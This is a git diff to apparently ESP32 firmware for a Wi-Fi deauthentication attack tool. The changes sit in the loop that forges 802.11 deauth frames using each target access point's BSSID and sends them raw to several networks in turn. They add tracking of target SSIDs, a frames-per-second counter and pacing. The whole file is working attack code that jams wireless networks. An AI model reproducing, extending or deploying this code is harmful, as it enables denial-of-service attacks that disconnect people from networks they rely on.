@@ -8,8 +8,10 @@
  */
 #include "wsl_bypasser.h"
 
+#include "esp_timer.h"
 #include <stdint.h>
 #include <string.h>
+#include "../../main/global.h"
 
 #define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
 #include "esp_log.h"
@@ -34,6 +36,9 @@ uint8_t deauth_frame_default[] = {
     0x00, 0x00,                         // Seq Control
     0x01, 0x00                          // Reason: Unspecified (0x0001)
 };
+
+static uint32_t counter = 0;
+static int64_t start_time = 0;
 
 
 /**
@@ -62,8 +67,11 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
         return;
     }
 
-    for (size_t i = 0; i < count; i++)
-    {
+    //taskENTER_CRITICAL(&dataMutex);
+
+    globalDataCount = count;
+
+    for (size_t i = 0; i < count; i++) {
         wifi_ap_record_t *ap_record = &ap_records[i];
 
         if (ap_record == NULL)
@@ -71,6 +79,12 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
             ESP_LOGI(TAG, "ERROR: Pusty element");
             return;
         }
+
+        if (globalData[i] != NULL) {
+            free(globalData[i]); // avoid memory leak!
+        }
+        globalData[i] = strdup((char *)ap_record->ssid);
+
 
         ESP_LOGI(TAG, "Preparations to send deauth frame...");
         ESP_LOGI(TAG, "Target SSID: %s", ap_record->ssid);
@@ -81,14 +95,31 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
       
         wifictl_set_channel(ap_record->primary);
 
+        if (counter == 0) {
+            start_time = esp_timer_get_time(); // Pobranie aktualnego czasu w µs
+        }
+
         uint8_t deauth_frame[sizeof(deauth_frame_default)];
         memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
         memcpy(&deauth_frame[10], ap_record->bssid, 6);
         memcpy(&deauth_frame[16], ap_record->bssid, 6);
 
-        //vTaskDelay(pdMS_TO_TICKS(1000)); // Poczekaj sekundę
         wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+        counter++;
+
+        int64_t elapsed_time = esp_timer_get_time() - start_time;
+        if (elapsed_time >= 1000000) {
+            ESP_LOGD(TAG, "%u frames sent per second", counter);
+            framesPerSecond = counter;
+            counter = 0; 
+            start_time = esp_timer_get_time(); 
+        }
+
+        vTaskDelay(pdMS_TO_TICKS(10));
     }
+
+    //taskEXIT_CRITICAL(&dataMutex);
+
 }
 
 void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record)
